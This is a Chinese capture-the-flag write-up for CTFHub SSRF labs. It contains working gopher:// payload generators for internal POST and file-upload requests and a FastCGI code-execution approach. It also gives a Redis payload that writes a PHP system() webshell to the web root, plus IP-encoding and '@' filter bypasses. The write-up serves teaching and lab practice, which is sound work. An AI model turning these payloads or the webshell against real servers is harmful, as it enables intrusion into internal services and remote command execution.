<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># view-source:http://challenge-97df9c16e9c64c56.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># view-source:http://challenge-97df9c16e9c64c56.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-variable">$flag</span>=<span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>] == <span class="hljs-variable">$key</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;key&quot;</span>&gt;<br>&lt;!-- Debug: key=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<span class="hljs-meta">?&gt;</span>--&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure>
<p>我们仔细观察<code>flag.php</code>文件的内容即可发现，只要伪造来自内网的请求，然后post一个提供的key<code>260a97ac2ef360dec36238c7d6c49c25</code>即可得到flag。</p>
<p>但是这种伪造可不好实现。php中的<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>，它会返回当前浏览页面的用户的ip地址。</p>
<p>这并不是简单的修改HTTP报文能够实现的。查看过wp之后，我了解到了gopher协议。</p>
<blockquote>
<p>gopher协议（攻击内网服务的万金油）：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p>
<p>URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</p>
</blockquote>
<p>相当于我们得利用这个gopher协议来让题目的机器给<code>flag.php</code>发送一个post请求包。这里就把ctfhub这个专题的名字<code>SSRF(Server-Side Request Forgery) 服务器端请求伪造</code>演示的淋漓尽致了。我们将利用gopher协议模拟服务器向flag.php的请求。</p>
<p>查询过资料后gopher协议中的post请求需要包含几个必要的字段<code>HOST</code>，<code>Content-Length</code>,<code>Content-Type</code>。</p>
<p>同时需要经过两层url加密，为什么呢？因为一开始gopher协议给url参数传的时候浏览器会进行第一次url解码。传给php了，php那里的curl_exec相当于还是一次类浏览器操作，会进行第二次url解码。</p>
<p>此外还要注意第一次url编码后需要将<code>%0A</code>全部换为<code>%0D0A</code>。其实就是把换行符<code>\n</code>换为<code>\r\n</code>。</p>
<p><img src="https://upyun.wuuconix.link/image-20210909223406812.png" srcset="/img/loading.gif" lazyload alt="换行符的url编码值" /></p>
<p>Linux里的换行比较简约，一个<code>\n</code>即可。而Window的换行比较阔绰，多一个字符<code>\r\n</code>。</p>
<p>这里需要换，估计是内网的机器是windows的？挺奇怪的。一般出题都是docker部署，应该都是Linux的呀2333。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>payload = \<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">POST /flag.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 36</span><br><span class="hljs-string"></span><br><span class="hljs-string">key=260a97ac2ef360dec36238c7d6c49c25</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = quote(payload)<br>payload = payload.replace(<span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>payload = <span class="hljs-string">f&quot;gopher://127.0.0.1:80/_<span class="hljs-subst">&#123;quote(payload)&#125;</span>&quot;</span><br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210909222419140.png" srcset="/img/loading.gif" lazyload alt="result" /></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:80</span>/_%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>APOST%<span class="hljs-number">2520</span>/flag.php%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Type%<span class="hljs-number">253</span>A%<span class="hljs-number">2520</span>application/x-www-form-urlencoded%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Length%<span class="hljs-number">253</span>A%<span class="hljs-number">252036</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Akey%<span class="hljs-number">253</span>D260a97ac2ef360dec36238c7d6c49c25%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br></code></pre></td></tr></table></figure>
<p>我们把这一段payload加到url那里就可以得到flag啦！</p>
<p><img src="https://upyun.wuuconix.link/image-20210909222517014.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>gopher那里一开始Host我写的是<code>127.0.0.1</code>貌似不行，必须得指定端口。</p>
<h3 id="上传文件"><a class="markdownIt-Anchor" href="#上传文件"></a> 上传文件</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># view-source:http://challenge-608a043246aa77d5.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>Upload Webshell<br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># view-source:http://challenge-608a043246aa77d5.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure>
<p>查看过它的flag.php之后我们只要模拟服务器向flag.php发送一个文件即可获得flag。同样的，我们利用攻击内网服务万金油gopher协议来实现。</p>
<p>原题的上传压根就没有上传按钮，都没法抓包2333。于是我加了一个<code>submit</code>类型的input然后先把服务放在自己的机器上，进行抓包。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210910173005459.png" srcset="/img/loading.gif" lazyload alt="模拟 抓包" /></p>
<p>然后删除不必要的字段，保留<code>Host</code>,<code>Content-Length</code>,<code>Content-Type</code>以及第一行的POST请求，注意对Host进行修改，修改成内网。得到以下POC。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>payload = \<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">POST /flag.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------73242662227339777571999664765</span><br><span class="hljs-string">Content-Length: 221</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------73242662227339777571999664765</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;upload.txt&quot;</span><br><span class="hljs-string">Content-Type: text/plain</span><br><span class="hljs-string"></span><br><span class="hljs-string">1</span><br><span class="hljs-string">-----------------------------73242662227339777571999664765--</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = quote(payload)<br>payload = payload.replace(<span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>payload = <span class="hljs-string">f&quot;gopher://127.0.0.1:80/_<span class="hljs-subst">&#123;quote(payload)&#125;</span>&quot;</span><br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
<p>运行后可以生成以下gopher协议数据包。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:80</span>/_%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>APOST%<span class="hljs-number">2520</span>/flag.php%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Type%<span class="hljs-number">253</span>A%<span class="hljs-number">2520</span>multipart/form-data%<span class="hljs-number">253</span>B%<span class="hljs-number">2520</span>boundary%<span class="hljs-number">253</span>D---------------------------<span class="hljs-number">73242662227339777571999664765</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Length%<span class="hljs-number">253</span>A%<span class="hljs-number">2520221</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A-----------------------------<span class="hljs-number">73242662227339777571999664765</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Disposition%<span class="hljs-number">253</span>A%<span class="hljs-number">2520</span>form-data%<span class="hljs-number">253</span>B%<span class="hljs-number">2520</span>name%<span class="hljs-number">253</span>D%<span class="hljs-number">2522</span>file%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">2520</span>filename%<span class="hljs-number">253</span>D%<span class="hljs-number">2522</span>upload.txt%<span class="hljs-number">2522</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Type%<span class="hljs-number">253</span>A%<span class="hljs-number">2520</span>text/plain%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A-----------------------------<span class="hljs-number">73242662227339777571999664765</span>--%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br></code></pre></td></tr></table></figure>
<p>之后把这一串放在url参数里发送就可以得到flag啦！</p>
<p><img src="https://upyun.wuuconix.link/image-20210910173257456.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<p>这里需要注意一点，我试了一下把Host写成<code>http://127.0.0.1:80</code>，无法得到flag。必须是规范的<code>ip:port</code>格式。</p>
<p>这类题只要了解了gopher协议本质上都差不多。</p>
<h3 id="fastcgi协议"><a class="markdownIt-Anchor" href="#fastcgi协议"></a> FastCGI协议</h3>
<p>CGI 即 <code>Common Gateway Interface</code> 通用网关接口。php里常见到的fpm就是<code>FastCGI Process Interface</code> FastCGI进行管理器 的缩写。其作用就是让php作为一个外部拓展应用去与http服务器进行联系。</p>
<p>这道题就是让我们利用那个url参数发送gopher数据包来和在内网9000端口上的fastcgi建立联系，让它执行某种命令。</p>
<p>大致思路就是在fastcgi协议中加入两个重要的配置。</p>
<blockquote>
<p>auto_prepend_file = php://input<br />
allow_url_include = On</p>
</blockquote>
<p><code>auto_prepend_file</code>会在所有的phpwe文件顶部加载文件。这里加载的是<code>php://input</code>，相当于把我们传递的php语句放在文件顶部从而实现任意命令执行。</p>
<p>当然<code>php://input</code>需要开启<code>allow_url_include</code>才能生效。</p>
<p>这道题看了wp后了解到一个挺好用的脚本，能够直接生成gopher报文。<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">tarunkant/Gopherus</a></p>
<p>是用python2编写的，用起来十分简单。输入一个可用的php文件以及你想执行的命令即可。</p>
<p><img src="https://upyun.wuuconix.link/image-20210910185123554.png" srcset="/img/loading.gif" lazyload alt="gopherus" /></p>
<p>它产生的gopher报文里内部的请求已经url编码了，但是我们把这个传递给题目的时候还需要再一次url编码。</p>
<p><img src="https://upyun.wuuconix.link/image-20210910185322316.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<h3 id="redis协议"><a class="markdownIt-Anchor" href="#redis协议"></a> Redis协议</h3>
<p>昨天下载的<code>Gopherus</code>工具里就有Redis的payload2333。它的默认paylaod是这样的。</p>
<p><img src="https://upyun.wuuconix.link/image-20210911234715662.png" srcset="/img/loading.gif" lazyload alt="redis" /></p>
<p>把它的paylaod url解码一下，结果是这样的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://127.0.0.1:6379/_*1<br><span class="hljs-variable">$8</span><br>flushall<br>*3<br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$1</span><br>1<br><span class="hljs-variable">$34</span><br><br><br>&lt;?php system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); ?&gt;<br><br><br>*4<br><span class="hljs-variable">$6</span><br>config<br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">dir</span><br><span class="hljs-variable">$13</span><br>/var/www/html<br>*4<br><span class="hljs-variable">$6</span><br>config<br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$9</span><br>shell.php<br>*1<br><span class="hljs-variable">$4</span><br>save<br></code></pre></td></tr></table></figure>
<p>其中的<code>*</code>大概指的是接下去管的变量的个数，<code>$</code>后面跟的数是后面变量字符串的长度。</p>
<p>我们仔细观察它给出的payload可以观察到它的换行已经是<code>%0D%0A</code>了，所以这也就是昨天Fastcgi协议没有变换行就能直接ctf的原因。</p>
<p>所以今天这个也只要把它给的payload再经过一次url编码就是最终的payload了。</p>
<p>可以直接在burp里面进行变换。<code>右键-&gt; Convert Selection-&gt; URL-&gt; URLencode key characters</code>即可实现把选中部分进行url编码。</p>
<p>然后我可以看看<code>shell.php</code>是否写入。</p>
<p><img src="https://upyun.wuuconix.link/image-20210911235411166.png" srcset="/img/loading.gif" lazyload alt="shell" /></p>
<p>但是可能由于有一些多余数据的原因，导致蚁剑没法连接，但是无伤大雅，直接手动命令执行即可。</p>
<p><img src="https://upyun.wuuconix.link/image-20210911235458809.png" srcset="/img/loading.gif" lazyload alt="ls" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210911235508129.png" srcset="/img/loading.gif" lazyload alt="ls /" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210911235516858.png" srcset="/img/loading.gif" lazyload alt="cat /flag" /></p>
<h3 id="url-bypass"><a class="markdownIt-Anchor" href="#url-bypass"></a> URL Bypass</h3>
<p><img src="https://upyun.wuuconix.link/image-20210912203035512.png" srcset="/img/loading.gif" lazyload alt="题目" /></p>
<p>题目提示必须以某个网站作为开始，但是我们的目标肯定是127.0.0.1，那怎么办呢？</p>
<p>查询过资料后发现url中有个神奇的字符<code>@</code>。使用过后，前面的网站直接失效，而去访问后面的网站。</p>
<p>这里直接能访问到我的博客2333。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">1</span>abe55a5f7cb9ddc.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?url=http://notfound.ctfhub.com@wuuconix.link:<span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210912203203810.png" srcset="/img/loading.gif" lazyload alt="test" /></p>
<p>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-<span class="hljs-number">1</span>abe55a5f7cb9ddc.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?url=http:/</span><span class="hljs-regexp">/notfound.ctfhub.com@127.0.0.1/</span>flag.php<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210912203313048.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<h3 id="数字ip-bypass"><a class="markdownIt-Anchor" href="#数字ip-bypass"></a> 数字IP Bypass</h3>
<p><img src="https://upyun.wuuconix.link/image-20210912204028892.png" srcset="/img/loading.gif" lazyload alt="过滤" /></p>
<p>一开始提示过滤了<code>127</code>，<code>172</code>和<code>@</code>。查看资料后发现有很多ip有很多其他的形态，这里摘抄一下。</p>
<blockquote>
<p>例如192.168.0.1<br />
(1)、8进制格式：0300.0250.0.1<br />
(2)、16进制格式：0xC0.0xA8.0.1<br />
(3)、10进制整数格式：3232235521<br />
(4)、16进制整数格式：0xC0A80001</p>
<p>还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1</p>
<ol>
<li><a target="_blank" rel="noopener" href="http://0/">http://0/</a></li>
<li><a target="_blank" rel="noopener" href="http://127.1/">http://127.1/</a></li>
<li>利用ipv6绕过，http://[::1]/</li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1">http://127.0.0.1</a>./</li>
</ol>
</blockquote>
<p>我便尝试了一下八进制的127.0.01。</p>
<p><img src="https://upyun.wuuconix.link/image-20210912204358718.png" srcset="/img/loading.gif" lazyload alt="过滤." /></p>
<p>结果又说过滤<code>.</code>了，佛了，那就再试试整数。</p>
<p><img src="https://upyun.wuuconix.link/image-20210912204435718.png" srcset="/img/loading.gif" lazyload alt="127.0.0.1的整数形式" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210912204512250.png" srcset="/img/loading.gif" lazyload alt="2130706433" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210912204543629.png" srcset="/img/loading.gif" lazyload alt="0x7f000001" /></p>
<p>成功得到flag。</p>
<h3 id="302跳转-bypass"><a class="markdownIt-Anchor" href="#302跳转-bypass"></a> 302跳转 Bypass</h3>
<p>这道题出的十分不严谨，以下是它的<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">?php<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/127|172|10|192/&quot;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker! Ban Intranet IP&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure>
<p>只是对ip做了最简单的过滤 ，这就导致上道题的payload完全试用。</p>
<p><img src="https://upyun.wuuconix.link/image-20210912210819518.png" srcset="/img/loading.gif" lazyload alt="payload" /></p>
